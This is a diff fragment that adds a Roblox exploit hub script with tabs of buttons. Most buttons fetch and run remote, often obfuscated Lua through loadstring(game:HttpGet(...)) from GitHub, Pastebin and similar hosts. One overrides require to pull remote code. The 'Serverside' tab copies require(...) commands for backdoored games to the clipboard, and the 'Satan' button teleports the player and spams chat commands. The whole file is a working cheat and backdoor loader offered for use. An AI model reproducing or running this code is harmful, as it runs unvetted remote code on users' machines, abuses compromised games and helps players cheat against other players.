+        loadstring(game:HttpGet("https://pastefy.app/h2Ue2y3m/raw"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "No Fe Snake (VS/CS)",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Avtor1zaTion/NO-FE-SNAKE/refs/heads/main/NO-FE-Snake.txt'))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Grab Sword (R6) (NKS) (VS/CS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Satan (JBP)",
+    Callback = function()
+        if not game:GetService("ReplicatedStorage"):FindFirstChild("01_server") then 
+            local a=game:GetService("CollectionService")
+            local b={}
+            b["ScreenGui_1"]=Instance.new("ScreenGui",game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
+            b["ScreenGui_1"].IgnoreGuiInset=true 
+            b["ScreenGui_1"].ScreenInsets=Enum.ScreenInsets.DeviceSafeInsets 
+            b["ScreenGui_1"].ZIndexBehavior=Enum.ZIndexBehavior.Sibling 
+            a:AddTag(b["ScreenGui_1"],"main")
+            b["Frame_2"]=Instance.new("Frame",b["ScreenGui_1"])
+            b["Frame_2"].BorderSizePixel=0 
+            b["Frame_2"].BackgroundColor3=Color3.fromRGB(0,0,0)
+            b["Frame_2"].AnchorPoint=Vector2.new(.5,.5)
+            b["Frame_2"].Size=UDim2.new(.36316,0,.46667,0)
+            b["Frame_2"].Position=UDim2.new(.5,0,.5,0)
+            b["Frame_2"].BackgroundTransparency=.5 
+            b["UICorner_3"]=Instance.new("UICorner",b["Frame_2"])
+            b["UICorner_3"].CornerRadius=UDim.new(.04,0)
+            b["TextLabel_4"]=Instance.new("TextLabel",b["Frame_2"])
+            b["TextLabel_4"].TextWrapped=true 
+            b["TextLabel_4"].BorderSizePixel=0 
+            b["TextLabel_4"].TextScaled=true 
+            b["TextLabel_4"].BackgroundColor3=Color3.fromRGB(255,255,255)
+            b["TextLabel_4"].TextColor3=Color3.fromRGB(255,255,255)
+            b["TextLabel_4"].BackgroundTransparency=1 
+            b["TextLabel_4"].Size=UDim2.new(.81159,0,.32143,0)
+            b["TextLabel_4"].Text="You are in the wrong game, please copy the link below and enter the game. (game: Just a baseplate., game creator: dreammazestudio)"
+            b["TextLabel_4"].Position=UDim2.new(.0942,0,.13095,0)
+            b["TextBox_5"]=Instance.new("TextBox",b["Frame_2"])
+            b["TextBox_5"].CursorPosition=-1 
+            b["TextBox_5"].BorderSizePixel=0 
+            b["TextBox_5"].BackgroundColor3=Color3.fromRGB(255,255,255)
+            b["TextBox_5"].ClearTextOnFocus=false 
+            b["TextBox_5"].Size=UDim2.new(.81159,0,.29762,0)
+            b["TextBox_5"].Position=UDim2.new(.1087,0,.5119,0)
+            b["TextBox_5"].Text="https://www.roblox.com/games/17574618959/Just-a-baseplate"
+            b["TextBox_5"].TextScaled=true 
+            b["UIAspectRatioConstraint_6"]=Instance.new("UIAspectRatioConstraint",b["Frame_2"])
+            b["UIAspectRatioConstraint_6"].AspectRatio=1.64286 
+            game:GetService("TeleportService"):Teleport(17574618959,game:GetService("Players").LocalPlayer)
+            return b["ScreenGui_1"],require 
+        end
+
+        local TextChatService = game:GetService("TextChatService")
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+        local function SendChatMessage(message)
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                if textChannel then
+                    textChannel:SendAsync(message)
+                else
+                    warn("RBXGeneral channel not found!")
+                end
+            else
+                local sayMessageRequest = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest")
+                if sayMessageRequest then
+                    sayMessageRequest:FireServer(message, "All")
+                else
+                    warn("Legacy chat system not found!")
+                end
+            end
+        end
+
+        local customMessage = "-gh 10775031176, 12103236257, 9867481700, 9867487176, 9350274205, 2493590711, 9350274205, 9402600266, 2309346267"
+        local netMessage = "-net"
+
+        SendChatMessage(customMessage)
+        wait(2.1)
+
+        local player = game:GetService("Players").LocalPlayer
+        game:GetService("RunService").RenderStepped:Connect(function()
+            if player.Character then
+                for i,v in pairs(player.Character:GetDescendants()) do
+                    if v:IsA("BasePart") then
+                        v.CanCollide = false
+                    end
+                end 
+            end
+        end)
+        wait(1.5)
+        task.delay(5.6, function()
+            SendChatMessage(netMessage)
+        end)
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty36.lua"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Sin Dragon (NKS) (VS/CS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/Sin%20Dragon"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Server Admin (R6) (NKS) (VS/CS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/Server%20Admin"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Steve (R6) (NKS) (VS/CS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Steve-script-24707"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Xester (R6) (VS/CS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Steve-script-24707"))()
+    end
+})
+
+-- Serverside Tab
+local ServersideTab = Window:CreateTab("Serverside", nil)
+
+ServersideTab:CreateButton({
+    Name = "Luau X SS",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/gojohdkaisenkt2/Gojohdkaisenkt-/refs/heads/main/L", true))()
+
+        local sources = {
+            [1992862829] = "https://raw.githubusercontent.com/gojohdkaisenkt2/Gojohdkaisenkt-/refs/heads/main/Idkl"
+        }
+
+        local oldRequire = require
+        require = function(src)
+            if type(src) == "number" and sources[src] then
+                return loadstring(game:HttpGet(sources[src]))()
+            else
+                return oldRequire(src)
+            end
+        end
+
+        require(1992862829)("urname")
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Nuke",
+    Callback = function()
+        setclipboard('require(4867426485):SD2("name")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Dark Mango Psychology ",
+    Callback = function()
+        setclipboard('require(122775270569362)("username")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Polaria",
+    Callback = function()
+        setclipboard('require(93218599314854).Pload("name")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Grab Gun (R6) (NKS)",
+    Callback = function()
+        setclipboard('require(5146659840).Dark_Eccentric("Dark_Eccentric", "UsernameHere")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Saitama (R6)",
+    Callback = function()
+        setclipboard('require(14499140823)("username","saitama2")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Mafioso (R6) (NKS)",
+    Callback = function()
+        setclipboard('require (82428270854492). sigma ("YourNameHere")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Crucifix",
+    Callback = function()
+        setclipboard('require(12933040327)("YourNameHere")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Manga Sukuna (NKS (R6)",
+    Callback = function()
+        setclipboard('require(135612536689375).Load("YourNameHere",true)')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Garou (R6)",
+    Callback = function()
+        setclipboard('require(14499140823)("YourNameHere", "garou2")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Aizen (R6)",
+    Callback = function()
+        setclipboard('require(89529616632600)("YourNameHere", "Aizen")')
+    end
+})
+
+
+ServersideTab:CreateButton({
+    Name = "Kick Gui",
+    Callback = function()
+        setclipboard('require(18773714173).SuperEpikKickGui("yourusernamehere")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Happy Hub SS",
+    Callback = function()
+        setclipboard('require(110047253067635):Hload("username")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Illuminati Gui",
+    Callback = function()
+        setclipboard('require(105544298869931).Fixed("username")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Satoru Gojo (R6)",
+    Callback = function()
+        setclipboard('require(14499140823)("username", "sorcerer")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Sf Remake V3",
+    Callback = function()
+        setclipboard('require(132592022786319).SFV3PC("username")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Blue2spooky Gui",
+    Callback = function()
+        setclipboard('require(132099457182422):blue2spooky("username")')
+    end
+})
+
+ServersideTab:CreateButton({
+    Name = "Toji (R6)",
+    Callback = function()
+        setclipboard('require(79380098887108).Toji("your name")')
+    end
+})
+
+-- Games Tab
+local GamesTab = Window:CreateTab("Games", nil)
+
+GamesTab:CreateButton({
+    Name = "Brookhaven",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Chaos-hub-/refs/heads/main/obfuscated_script-1753037381403.lua.txt"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Build A Boat",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Chaos-hub-/refs/heads/main/obfuscated_script-1753037381403.lua.txt"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Natural Disaster Survival",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Codexxscripts/Script/refs/heads/main/Protected_7867058958573066.lua.txt"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "The Strongest Battleground",
+    Callback = function()               
+	    loadstring(game:HttpGet("https://raw.githubusercontent.com/hehehe9028/THE-strongest-battleground/refs/heads/main/HOKALAZA%20The%20strongest%20battleground"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "99 Nights In The Forest",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/99-Nights-in-the-Forest-Voidware-52345"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Forsaken",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/wefwef127382/forsakenloader.github.io/refs/heads/main/RINGTABUBLIK.lua"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Doors",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TheHunterSolo1/Scripts/refs/heads/main/Protected_2809220311826785.lua.txt"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Dead Rails",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/wefwef127382/DEADRAILS.github.io/refs/heads/main/mainringta.lua"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Fling Things And People",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHubScript/_/refs/heads/main/f"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fratelevostru9999/src/refs/heads/main/VenomX%20Fling%20Things%20And%20People",true))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Murder Mystery 2",
+    Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/a2JPAST5'))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Fisch",
+    Callback = function()
+       loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8f8192c38b9f17c066c3c842002eaaa2.lua"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Tower Of Hell",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/madenciicom/towerofhell/refs/heads/main/TowerOfHell_KaiXar.lua"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Ink Game",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/wefwef127382/inkgames.github.io/refs/heads/main/ringta.lua"))()
+    end
+})
+
+GamesTab:CreateButton({
+    Name = "Fish It",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/nniellx/SeraphinHub/main/SeraphinMain.lua"))()
+    end
+})
+
+-- Vehicles Tab
+local VehiclesTab = Window:CreateTab("Vehicles", nil)
+
+VehiclesTab:CreateButton({
+    Name = "Infinite Yield",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+    end
+})
+
+VehiclesTab:CreateButton({
+    Name = "System Broken",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
+    end
+})
+
+VehiclesTab:CreateButton({
+    Name = "Ghost Hub",
+    Callback = function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()
+        end)
+        if not success then
+            warn("Ghost Hub yüklenirken bir hata oluştu: " .. err)
+        end
+    end
+})
+
+VehiclesTab:CreateButton({
+    Name = "Browser",
+    Callback = function()
+        local function formatUrl(input)
+            input = input:match("^%s*(.-)%s*$")
+            if input == "" then
+                return nil, "Please enter a URL or search query."
+            end
+            if input:match("^https?://") then
+                return input, nil
+            end
+            local searchQuery = input:gsub(" ", "+")
+            return "https://www.google.com/search?q=" .. searchQuery, nil
+        end
+
+        local function open_browser(url, asJson)
+            local info = { presentationStyle = 2, url = tostring(url or ""), title = "Web Browser", visible = true }
+            local msg = asJson and HttpService:JSONEncode(info) or (info.title .. "\n" .. info.url)
+            GuiService:BroadcastNotification(msg, 20)
+        end
+        
+        if PlayerGui:FindFirstChild("BrowserGui") then
+            PlayerGui:FindFirstChild("BrowserGui"):Destroy()
+        end
+
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "BrowserGui"
+        screenGui.Parent = PlayerGui
+        screenGui.ResetOnSpawn = false
+
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 500, 0, 60)
+        frame.Position = UDim2.new(0.5, -250, 1, 60)
+        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        frame.BorderSizePixel = 0
+        frame.Parent = screenGui
+
+        local uiGradient = Instance.new("UIGradient")
+        uiGradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))
+        }
+        uiGradient.Parent = frame
+
+        local uiCornerFrame = Instance.new("UICorner")
+        uiCornerFrame.CornerRadius = UDim.new(0, 12)
+        uiCornerFrame.Parent = frame
+
+        local uiStrokeFrame = Instance.new("UIStroke")
+        uiStrokeFrame.Thickness = 1
+        uiStrokeFrame.Color = Color3.fromRGB(40, 40, 40)
+        uiStrokeFrame.Transparency = 0.7
+        uiStrokeFrame.Parent = frame
+
+        local dragHandle = Instance.new("Frame")
+        dragHandle.Size = UDim2.new(1, 0, 0, 4)
+        dragHandle.Position = UDim2.new(0, 0, 0, 0)
+        dragHandle.BackgroundTransparency = 1
+        dragHandle.Parent = frame
+
+        for i = 1, 5 do
+            local gripDot = Instance.new("Frame")
+            gripDot.Size = UDim2.new(0, 3, 0, 3)
+            gripDot.Position = UDim2.new(0.5, -30 + (i * 12), 0, 1)
+            gripDot.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+            gripDot.BorderSizePixel = 0
+            gripDot.Parent = dragHandle
+        end
+
+        local textBox = Instance.new("TextBox")
+        textBox.Size = UDim2.new(0.85, -50, 0, 35)
+        textBox.Position = UDim2.new(0.05, 0, 0.5, -17.5)
+        textBox.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+        textBox.BackgroundTransparency = 0.5
+        textBox.TextColor3 = Color3.fromRGB(220, 220, 220)
+        textBox.PlaceholderText = "e.g, google.com"
+        textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
+        textBox.Font = Enum.Font.Gotham
+        textBox.TextSize = 14
+        textBox.TextXAlignment = Enum.TextXAlignment.Left
+        textBox.Text = ""
+        textBox.Parent = frame
+
+        local uiCornerTextBox = Instance.new("UICorner")
+        uiCornerTextBox.CornerRadius = UDim.new(0, 8)
+        uiCornerTextBox.Parent = textBox
+
+        local uiStrokeTextBox = Instance.new("UIStroke")
+        uiStrokeTextBox.Thickness = 1
+        uiStrokeTextBox.Color = Color3.fromRGB(50, 50, 50)
+        uiStrokeTextBox.Transparency = 0.3
+        uiStrokeTextBox.Parent = textBox
+
+        local function addHoverEffect(element)
+            local originalStrokeColor = uiStrokeTextBox.Color
+            
+            element.MouseEnter:Connect(function()
+                TweenService:Create(element, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.4}):Play()
+                uiStrokeTextBox.Color = Color3.fromRGB(70, 70, 70)
+            end)
+            
+            element.MouseLeave:Connect(function()
+                TweenService:Create(element, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.5}):Play()
+                uiStrokeTextBox.Color = originalStrokeColor
+            end)
+        end
+
+        addHoverEffect(textBox)
+
+        local sendButton = Instance.new("TextButton")
+        sendButton.Size = UDim2.new(0, 35, 0, 35)
+        sendButton.Position = UDim2.new(0.9, -10, 0.5, -17.5)
+        sendButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        sendButton.BackgroundTransparency = 0.7
+        sendButton.Text = "↑"
+        sendButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+        sendButton.Font = Enum.Font.GothamBold
+        sendButton.TextSize = 16
+        sendButton.Parent = frame
+
+        local uiCornerButton = Instance.new("UICorner")
+        uiCornerButton.CornerRadius = UDim.new(0, 17.5)
+        uiCornerButton.Parent = sendButton
+
+        local uiStrokeButton = Instance.new("UIStroke")
+        uiStrokeButton.Thickness = 1
+        uiStrokeButton.Color = Color3.fromRGB(100, 100, 100)
+        uiStrokeButton.Transparency = 0.4
+        uiStrokeButton.Parent = sendButton
+
+        local function addButtonHover(element)
+            local originalStrokeColor = uiStrokeButton.Color
+            
+            element.MouseEnter:Connect(function()
+                TweenService:Create(element, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.6}):Play()
+                uiStrokeButton.Color = Color3.fromRGB(150, 150, 150)
+            end)
+            
+            element.MouseLeave:Connect(function()
+                TweenService:Create(element, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.7}):Play()
+                uiStrokeButton.Color = originalStrokeColor
+            end)
+        end
+
+        addButtonHover(sendButton)
+
+        local statusLabel = Instance.new("TextLabel")
+        statusLabel.Size = UDim2.new(0.9, 0, 0, 20)
+        statusLabel.Position = UDim2.new(0.05, 0, 0.85, 0)
+        statusLabel.BackgroundTransparency = 1
+        statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+        statusLabel.Font = Enum.Font.Gotham
+        statusLabel.TextSize = 12
+        statusLabel.Text = ""
+        statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+        statusLabel.Parent = frame
+
+        local function animateOpen()
+            local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+            local goal = {Position = UDim2.new(0.5, -250, 0.9, -30)}
+            TweenService:Create(frame, tweenInfo, goal):Play()
+        end
+
+        animateOpen()
+
+        local dragging = false
+        local dragInput
+        local dragStart
+        local startPos
+
+        dragHandle.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                dragStart = input.Position
+                startPos = frame.Position
+                
+                input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then
+                        dragging = false
+                    end
+                end)
+            end
+        end)
+        
+        UIS.InputChanged:Connect(function(input)
+            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+                local delta = input.Position - dragStart
+                frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+            end
+        end)
+
+        sendButton.MouseButton1Click:Connect(function()
+            local input = textBox.Text
+            local url, errorMsg = formatUrl(input)
+            
+            if errorMsg then
+                statusLabel.Text = errorMsg
+                statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+                wait(3)
+                statusLabel.Text = ""
+                return
+            end
+            
+            statusLabel.Text = "Opening " .. input .. "..."
+            statusLabel.TextColor3 = Color3.fromRGB(100, 200, 100)
+            open_browser(url, true)
+            
+            wait(3)
+            statusLabel.Text = ""
+        end)
+
+        textBox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                sendButton.MouseButton1Click:Fire()
+            end
+        end)
+    end
+})
+
+VehiclesTab:CreateButton({
+    Name = "Sussy Gui",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/FWwdST5Y"))()
+    end
+})
+
+VehiclesTab:CreateButton({
+    Name = "QuirkyCMD",
+    Callback = function()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
+    end
+})
+
+VehiclesTab:CreateButton({
+    Name = "Afem Max",
+    Callback = function()        
+        loadstring(game:HttpGet("https://yarhm.mhi.im/scr?channel=afemmax"))()
+    end
+})
+
+VehiclesTab:CreateButton({
+    Name = "Lalol Hub",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
+    end
+})
